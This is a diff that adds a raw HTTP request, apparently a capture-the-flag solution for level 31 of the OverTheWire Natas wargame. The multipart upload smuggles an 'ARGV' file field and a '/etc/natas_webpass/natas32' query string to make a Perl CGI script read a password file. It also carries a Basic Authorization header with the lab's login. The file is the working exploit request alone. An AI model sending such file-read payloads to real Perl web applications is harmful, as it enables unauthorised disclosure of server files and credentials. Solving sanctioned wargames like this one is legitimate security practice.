@@ -1,0 +1,34 @@
+POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Accept-Language: en-GB,en;q=0.9
+Origin: http://natas31.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryiKOWsAqHmGBJboio
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://natas31.natas.labs.overthewire.org/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Length: 469
+
+------WebKitFormBoundaryiKOWsAqHmGBJboio
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundaryiKOWsAqHmGBJboio
+Content-Disposition: form-data; name="file"; filename="file.csv"
+Content-Type: text/csv
+
+sno,name,surname,young
+1,jack,anderson,yes
+2,ben,lara,no
+3,peter,svidler,no
+4,garry,simons,yes
+
+------WebKitFormBoundaryiKOWsAqHmGBJboio
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryiKOWsAqHmGBJboio--
